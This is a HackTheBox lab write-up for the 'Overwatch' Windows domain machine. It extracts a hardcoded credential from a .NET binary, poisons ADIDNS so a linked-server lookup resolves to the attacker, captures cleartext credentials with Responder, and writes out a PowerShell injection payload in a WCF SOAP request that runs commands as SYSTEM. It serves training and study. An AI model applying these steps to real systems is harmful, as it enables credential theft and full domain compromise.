---
title: "Overwatch — HackTheBox Writeup"
date: "2026-03-01"
description: "Medium Windows AD machine involving .NET WCF binary credential extraction, MSSQL linked server ADIDNS poisoning for credential coercion, and WCF SOAP PowerShell command injection as SYSTEM"
tags: ['hackthebox', 'writeup', 'windows', 'active directory', 'mssql', 'command injection', 'web pentest']
thumbnail: ""
---

# Overwatch — HTB Labs Machine Writeup

**Difficulty:** Medium
**OS:** Windows Server 2022
**Domain:** overwatch.htb

---

## Attack Chain Summary

```
SMB guest access → software$ share → overwatch.exe (.NET binary)
    → .NET string heap extraction → sqlsvc credentials
        → MSSQL on port 6520 → Linked server "SQL07" discovered
            → ADIDNS poisoning (sql07 → attacker IP)
                → Responder captures cleartext sqlmgmt credentials
                    → WinRM as sqlmgmt → User flag
                        → WCF KillProcess SOAP → PowerShell injection → SYSTEM
```

---

## Phase 1: Reconnaissance

### Port Scan

**Critical**: Full port scan (`-p-`) was essential — MSSQL was on **port 6520**, not standard 1433.

| Port | Service | Details |
|------|---------|---------|
| 53/tcp | DNS | Simple DNS Plus |
| 88/tcp | Kerberos | Microsoft Windows Kerberos |
| 445/tcp | SMB | Signing enabled and **required** |
| 5985/tcp | WinRM | Microsoft HTTPAPI 2.0 |
| **6520/tcp** | **MSSQL** | **Non-standard port** |

### SMB Enumeration

An SMB share `software$` was accessible with guest/anonymous READ permissions, containing:
- `overwatch.exe` — .NET Windows service binary
- `overwatch.exe.config` — WCF service configuration XML

### LDAP Enumeration

111 domain accounts enumerated. Key accounts: `sqlsvc`, `sqlmgmt` (Remote Management Users).

---

## Phase 2: Binary Analysis — Credential Extraction

The .NET binary's metadata string heap was extracted using `dnfile`:

```bash
python3 -c "
import dnfile
pe = dnfile.dnPE('overwatch.exe')
for i, s in enumerate(pe.net.metadata.streams['#US'].strings()):
    print(f'[{i}] {repr(s)}')
"
```

**Hardcoded MSSQL credential found:**
```
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=<redacted>;
```

The config file revealed a WCF service on `http://overwatch.htb:8000/MonitorService` with `KillProcess` operation that constructs `Stop-Process -Name <input> -Force`.

---

## Phase 3: MSSQL → ADIDNS Poisoning → Credential Capture

### Linked Server Discovery

```bash
k1r44@htb:~$ mssqlclient.py overwatch.htb/sqlsvc:'<redacted>'@10.129.7.253 -port 6520 -windows-auth
```

`sqlsvc` is NOT sysadmin — but a linked server `SQL07` was found. This is a DNS name, injectable via ADIDNS.

### ADIDNS Poisoning

Any authenticated domain user can add DNS A records:

```bash
python3 dnstool.py -u 'overwatch.htb\\sqlsvc' -p '<redacted>' \
  -a add -r sql07.overwatch.htb -d ATTACKER_IP 10.129.7.253
```

### Credential Capture

```bash
sudo responder -I tun0 -v
```

Trigger the linked server query:
```sql
EXEC ('SELECT 1') AT SQL07;
```

MSSQL linked server auth transmits credentials in **cleartext**:

```
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : <redacted>
```

### WinRM Access

```bash
evil-winrm -i 10.129.7.253 -u sqlmgmt -p '<redacted>'
```

---

## Phase 4: Privilege Escalation — WCF Command Injection

### WCF Service Enumeration

The internal WCF service at `localhost:8000/MonitorService` was confirmed running. WSDL revealed the `KillProcess` operation accepting a `processName` string.

### PowerShell Injection

The service constructs `Stop-Process -Name <input> -Force` without sanitization. Injection payload:

```
test -Force; <injected_command> #
```

Resulting execution: `Stop-Process -Name test -Force; <command> # -Force`

```powershell
$body = @"
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>test -Force; whoami | Out-File C:\Users\sqlmgmt\Documents\whoami.txt #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
"@

Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" `
  -Method POST -ContentType "text/xml; charset=utf-8" `
  -Headers @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} `
  -Body $body -UseBasicParsing
```

Output: `nt authority\system`

Root flag read via the same injection pattern.

---

## Failed Attempts

| # | What Was Tried | Why It Failed |
|---|----------------|---------------|
| 1 | AS-REP Roasting | No accounts had pre-auth disabled |
| 2 | Kerberoasting | No user accounts with SPNs |
| 3 | SMB relay | SMB signing required |
| 4 | MSSQL xp_cmdshell | sqlsvc lacks sysadmin role |

---

## Key Takeaways

1. **Always do a full port scan (`-p-`)** — MSSQL on port 6520 would have been missed with top-1000 scans.

2. **MSSQL linked servers are credential coercion primitives** — When the linked server DNS name is injectable via ADIDNS, credentials can be captured in cleartext by Responder.

3. **ADIDNS dynamic update is enabled by default** — Any authenticated domain user can add DNS A records.

4. **.NET binary analysis reveals hardcoded secrets** — Connection strings and command templates are visible in the `#US` metadata stream. `dnfile` extracts these without a full decompiler.

5. **WCF/SOAP services on localhost frequently run as SYSTEM** — Command injection via unsanitized input to PowerShell is trivial. The `#` comment trick neutralizes trailing arguments.

6. **SMB shares in AD environments hold sensitive tooling** — World-readable shares containing service binaries are prime targets for credential extraction.

---

## Tools Used

- `nmap` — Port scanning (full `-p-` essential)
- `smbclient` / `smbmap` — SMB share enumeration
- `ldapsearch` — LDAP domain user enumeration
- `dnfile` (Python) — .NET binary string heap extraction
- `mssqlclient.py` — MSSQL client on non-standard port
- `dnstool.py` (krbrelayx) — ADIDNS A record injection
- `Responder` — Cleartext MSSQL credential capture
- `evil-winrm` — WinRM shell access
- PowerShell `Invoke-WebRequest` — WCF SOAP request crafting
